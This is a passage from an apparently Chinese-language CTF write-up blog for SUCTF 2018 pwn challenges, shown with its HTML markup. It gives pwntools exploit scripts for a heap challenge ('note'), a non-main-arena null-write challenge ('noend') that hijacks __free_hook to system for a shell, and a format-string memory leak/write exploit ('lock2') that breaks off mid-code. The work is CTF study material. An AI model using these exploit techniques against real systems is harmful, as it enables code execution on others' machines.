class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#SUCTF&#123;Me1z1jiu_say_s0rry_LOL&#125;</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./note'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">libc = ELF(<span class="string">'./libc6_2.24-12ubuntu1_amd64.so'</span>)</span><br><span class="line">p = remote(<span class="string">'pwn.suctf.asuri.org'</span>,<span class="number">20003</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Welcome Homura Note Book!   '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Choice&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Choice&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Choice&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'(yes:1)'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">16</span>,<span class="string">'1'</span>*<span class="number">16</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak system address</span></span><br><span class="line">dele()</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line">offset =  <span class="number">0x7f1b15e2ab78</span><span class="number">-0x7f1b15a66000</span></span><br><span class="line">libc_base = libc_addr - <span class="number">88</span> - <span class="number">0x10</span> - libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">sys_addr = libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">malloc_hook = libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">io_list_all = libc_base+libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">binsh_addr = libc_base+next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line">log.info(<span class="string">'sys_addr:%#x'</span> %sys_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fake chunk</span></span><br><span class="line">fake_chunk = p64(<span class="number">0x8002</span>)+p64(<span class="number">0x61</span>) <span class="comment">#header</span></span><br><span class="line">fake_chunk += p64(<span class="number">0xddaa</span>)+p64(io_list_all<span class="number">-0x10</span>)</span><br><span class="line">fake_chunk += p64(<span class="number">0x2</span>)+p64(<span class="number">0xffffffffffffff</span>) + p64(<span class="number">0</span>)*<span class="number">2</span> +p64((binsh_addr<span class="number">-0x64</span>)/<span class="number">2</span>)</span><br><span class="line">fake_chunk = fake_chunk.ljust(<span class="number">0xa0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">fake_chunk += p64(sys_addr+<span class="number">0x420</span>)</span><br><span class="line">fake_chunk = fake_chunk.ljust(<span class="number">0xc0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">fake_chunk += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">vtable_addr = malloc_hook<span class="number">-13872</span><span class="comment">#+libc.symbols['_IO_str_jumps']</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">16</span> +fake_chunk</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(vtable_addr)</span><br><span class="line">payload += p64(sys_addr)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(<span class="number">3</span>) </span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span> <span class="comment"># vtable</span></span><br><span class="line">payload += p64(sys_addr)</span><br><span class="line">add(<span class="number">16</span>,payload)<span class="comment">#3</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">'Choice&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x200</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="noend"><a href="#noend" class="headerlink" title="noend"></a>noend</h1><p>这道题涉及的主要是非主分配区的分配方式，相关知识、代码分析和调试方法在之前的<a href="http://p4nda.top/2018/03/15/n1ctf2018/">N1CTF PWN题记录</a> 中提到过。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞存在于main函数中，对于malloc得到的指针，没有检验是否为0，就对size-1的位置写一个0，可以造成一字节的内存任意写</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">buf = <span class="built_in">malloc</span>(size);</span><br><span class="line">read(<span class="number">0</span>, buf, size);</span><br><span class="line">*((_BYTE *)buf + size - <span class="number">1</span>) = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>但是想要malloc返回为0，需要申请一个巨大的内存块大小，使得正常的main_arena无法处理，在_libc_malloc中有该部分的函数逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    (<span class="keyword">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_malloc)</span><br></pre></td></tr></table></figure><p>可以看到，在主分配区返回为空时，会初始化一个非主分配区，即<strong><em>ar_ptr = arena_get_retry (ar_ptr, bytes);</em></strong> ，而在此后，均会使用该非主分配区，而assert断言是在debug模式下起作用的，所以当两个分配区都无法处理时，就会返回一个空指针，造成任意写。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">arena_get_retry (mstate ar_ptr, <span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  LIBC_PROBE (memory_arena_retry, <span class="number">2</span>, bytes, ar_ptr);</span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != &amp;main_arena)</span><br><span class="line">    &#123;</span><br><span class="line">      (<span class="keyword">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line">      <span class="comment">/* Don't touch the main arena if it is corrupt.  */</span></span><br><span class="line">      <span class="keyword">if</span> (arena_is_corrupt (&amp;main_arena))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      ar_ptr = &amp;main_arena;</span><br><span class="line">      (<span class="keyword">void</span>) mutex_lock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      (<span class="keyword">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line">      ar_ptr = arena_get2 (bytes, ar_ptr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ar_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>漏洞利用分为地址泄露和地址劫持两部分。</p><h3 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h3><p>在主分配区和非主分配区里，其实质上的内存分配方式是一样的。由于题目限制，申请内存小于等于0x7f时都会释放，而大于时不会释放。</p><p>可以首先分配多个不同大小的fastbin大小的块，会释放并挂到fastbin链中去，再申请一个大块（大于0x78，小于等于0x7f），此时，这个块获取的应该为0x90大小，而释放时会与top合并。合并之后，会触发malloc_consolidate，触发后，fastbin中的较小的堆块由于不和top相连，因此会放到unsorted_bin中一次，最后全部合并后与top合并，造成，top中有部分包含main_arena+88或thread_arena+88的地址，可以再次分配回来造成地址泄露。</p><h3 id="劫持执行流"><a href="#劫持执行流" class="headerlink" title="劫持执行流"></a>劫持执行流</h3><p>在非主分配区中，同样利用内存任意写，对thread<em>arena中保存的top末位地址写0，可使top错位，其中size会落到可以控制的堆块地址中，可通过构造size大小使得可以分配到libc的地址中，劫持\</em>_free_hook为system。具体方法是将堆块分配到__free_hook之前，通过top的性质，将被误作为下一块size的__free_hook写为system+1的地址（需要构造提到的top size），虽然是system+1，但对整体没有影响。因为system的前五条指令是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /5i system</span><br><span class="line">   0x7fdf2f15c6a0 &lt;__libc_system&gt;:test   rdi,rdi</span><br><span class="line">   0x7fdf2f15c6a3 &lt;__libc_system+3&gt;:je     0x7fdf2f15c6b0 &lt;__libc_system+16&gt;</span><br><span class="line">   0x7fdf2f15c6a5 &lt;__libc_system+5&gt;:jmp    0x7fdf2f15c130 &lt;do_system&gt;</span><br><span class="line">   0x7fdf2f15c6aa &lt;__libc_system+10&gt;:nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x7fdf2f15c6b0 &lt;__libc_system+16&gt;:lea    rdi,[rip+0x145591]        # 0x7fdf2f2a1c48</span><br></pre></td></tr></table></figure><p>system+1的前五条指令是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /5i system+1</span><br><span class="line">   0x7fdf2f15c6a1 &lt;__libc_system+1&gt;:test   edi,edi</span><br><span class="line">   0x7fdf2f15c6a3 &lt;__libc_system+3&gt;:je     0x7fdf2f15c6b0 &lt;__libc_system+16&gt;</span><br><span class="line">   0x7fdf2f15c6a5 &lt;__libc_system+5&gt;:jmp    0x7fdf2f15c130 &lt;do_system&gt;</span><br><span class="line">   0x7fdf2f15c6aa &lt;__libc_system+10&gt;:nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x7fdf2f15c6b0 &lt;__libc_system+16&gt;:lea    rdi,[rip+0x145591]        # 0x7fdf2f2a1c48</span><br></pre></td></tr></table></figure><p>可以发现并没有执行上的影响，再次申请一个小堆块（小于0x50），并在其中写上’/bin/sh\0’就可以拿到shell。</p><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./noend'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./noend'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'c'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.sendline(str(size))</span><br><span class="line">time.sleep(<span class="number">0.2</span>)</span><br><span class="line">p.send(content)</span><br><span class="line">k = p.recvline()</span><br><span class="line"><span class="keyword">return</span> k</span><br><span class="line">build(<span class="number">0x28</span>,<span class="string">'1'</span>*<span class="number">8</span>)</span><br><span class="line">build(<span class="number">0x38</span>,<span class="string">'2'</span>*<span class="number">8</span>)</span><br><span class="line">build(<span class="number">0x7f</span>,<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">k = build(<span class="number">0x38</span>,<span class="string">'d'</span>*<span class="number">8</span>) <span class="comment">#泄露地址</span></span><br><span class="line">libc.address = u64(k[<span class="number">8</span>:<span class="number">8</span>+<span class="number">8</span>]) - <span class="number">0x10</span> - <span class="number">88</span> -libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system : '</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">p.sendline((str( <span class="number">0x10</span> + <span class="number">87</span> + libc.symbols[<span class="string">'__malloc_hook'</span>]))) <span class="comment"># 切换到非主分配区</span></span><br><span class="line">time.sleep(<span class="number">0.3</span>)</span><br><span class="line">build(<span class="number">0x38</span>,<span class="string">'A'</span>*<span class="number">8</span>)</span><br><span class="line">p.clean()</span><br><span class="line">build(<span class="number">0x28</span>,<span class="string">'1'</span>*<span class="number">8</span>)</span><br><span class="line">build(<span class="number">0x48</span>,<span class="string">'2'</span>*<span class="number">8</span>)</span><br><span class="line">build(<span class="number">0x7f</span>,<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">k = build(<span class="number">0x38</span>,<span class="string">'d'</span>*<span class="number">8</span>)</span><br><span class="line">thread_arena_addr_top = u64(k[<span class="number">8</span>:<span class="number">8</span>+<span class="number">8</span>])<span class="comment">#泄露非主分配区地址</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] thread_arena_addr  : '</span>,hex(thread_arena_addr_top)</span><br><span class="line">target = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">build(<span class="number">0xf0</span>,p64(target + (libc.symbols[<span class="string">'__free_hook'</span>] - thread_arena_addr_top +<span class="number">0x70</span><span class="number">-0x900</span> ) )*(<span class="number">0xf0</span>/<span class="number">8</span>))<span class="comment">#布置fake top size</span></span><br><span class="line">p.sendline(str(thread_arena_addr_top+<span class="number">1</span>))<span class="comment">#对thread_arena中的top值写末尾一字节</span></span><br><span class="line">time.sleep(<span class="number">0.3</span>)</span><br><span class="line">p.sendline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.clean()</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">build(libc.symbols[<span class="string">'__free_hook'</span>]-(thread_arena_addr_top<span class="number">-0x78</span>+<span class="number">0x900</span>)<span class="number">-0x18</span>,p64(libc.symbols[<span class="string">'system'</span>]))<span class="comment">#将__free_hook劫持为system+1</span></span><br><span class="line">build(<span class="number">0x10</span>,<span class="string">'/bin/sh\0'</span>)<span class="comment">#free后拿到shell</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="tip"><a href="#tip" class="headerlink" title="tip"></a>tip</h2><p>对于非主分配区程序的调试，我找到一种相对于简单的方法。</p><p>首先利用vmmap指令，找到非主分配区的mmap块位置：</p><p><img src="/img/SUCTF2018/2-1.png" alt=""></p><p>红框中标记的是堆和非主分配区的地址，二者应该是一样大的。</p><p>当找到非主分配区地址后，根据libc源码，其中第一块申请的应该是_heap_info结构体，因此，可以看到该结构体内容：</p><p><img src="/img/SUCTF2018/2-2.png" alt=""></p><p>而在该结构体内，其中第一个成员ar_ptr指向的就是非主分配区的arena结构体，与main_arena的结构体是一致的。</p><p><img src="/img/SUCTF2018/2-3.png" alt=""></p><p>注意，在一个thread_arena中仅有一个malloc_state结构体，位于第一个申请的内存块中。</p><h1 id="lock2"><a href="#lock2" class="headerlink" title="lock2"></a>lock2</h1><h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(offset)</span>:</span></span><br><span class="line">    <span class="comment"># context.log_level = 'DEBUG'</span></span><br><span class="line">    p = remote(<span class="string">'pwn.suctf.asuri.org'</span>, <span class="number">20001</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'password'</span>)</span><br><span class="line">    p.sendline(<span class="string">'123456'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">leak_format</span><span class="params">(start, length)</span>:</span></span><br><span class="line">        out = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(start, start + length):</span><br><span class="line">            out += <span class="string">'-%%%d$p'</span> % i</span><br><span class="line">        <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line">    <span class="comment"># for i in range(20):</span></span><br><span class="line">    <span class="comment">#     p.recvuntil('cmd:')</span></span><br><span class="line">    <span class="comment">#     format_string = leak_format(2 + 4*i, 4)</span></span><br><span class="line">    <span class="comment">#     p.sendline(format_string)</span></span><br><span class="line">    <span class="comment">#     print p.recvline()</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_cmd</span><span class="params">(p, cmd)</span>:</span></span><br><span class="line">        p.recvuntil(<span class="string">'cmd:'</span>)</span><br><span class="line">        p.sendline(cmd)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">leak_stack</span><span class="params">(p, index)</span>:</span></span><br><span class="line">        p.recvuntil(<span class="string">'cmd:'</span>)</span><br><span class="line">        p.sendline(<span class="string">"%%%d$pAAA"</span> % index)</span><br><span class="line">        p.recvuntil(<span class="string">'cmd:'</span>)</span><br><span class="line">        <span class="keyword">return</span> int(p.recvuntil(<span class="string">'AAA'</span>, drop=<span class="keyword">True</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">leak_mem</span><span class="params">(p, addr)</span>:</span></span><br><span class="line">        buf = <span class="string">'%7$s'</span> + <span class="string">'=--='</span> + p64(addr) + <span class="string">'bb'</span> </span><br><span class="line">        run_cmd(p, buf)</span><br><span class="line">        p.recvuntil(<span class="string">'cmd:'</span>)</span><br><span class="line">        <span class="keyword">return</span> p.recvuntil(<span class="string">'=--='</span>, drop=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write_mem</span><span class="params">(p, addr, value)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> value != <span class="number">0</span>:</span><br><span class="line">            buf = (<span class="string">'%%%dc%%7$hn'</span> % value).ljust(<span class="number">8</span>, <span class="string">'='</span>) + p64(addr) + <span class="string">'bb'</span> </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            buf = <span class="string">'%%7$hn'</span>.ljust(<span class="number">8</span>, <span class="string">'='</span>) + p64(addr) + <span class="string">'bb'</span> </span><br><span class="line"></span><br><span class="line">        run_cmd(p, buf)</span><br><span class="line">        p.recvuntil(<span class="string">'cmd:'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_codebase</span><span class="params">(p)</span>:</span></span><br><span class="line">        code_base = leak_stack(p, <span class="number">16</span>) &amp; (~<span class="number">0xfff</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            <span class="keyword">print</span> hex(code_base)</span><br><span class="line">            data = leak_mem(p, code_base)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'ELF'</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">print</span> data</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                code_base -= <span class="number">0x1000</span></span><br><span class="line">                </span><br><span class="line">        <span class="keyword">print</span> <span class="string">'code_base is '</span> + hex(code_base)</span><br><span class="line">        <span class="keyword">return</span> code_base</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dumpmem</span><span class="params">(offset, length)</span>:</span></span><br><span class="line">        p = remote(<span 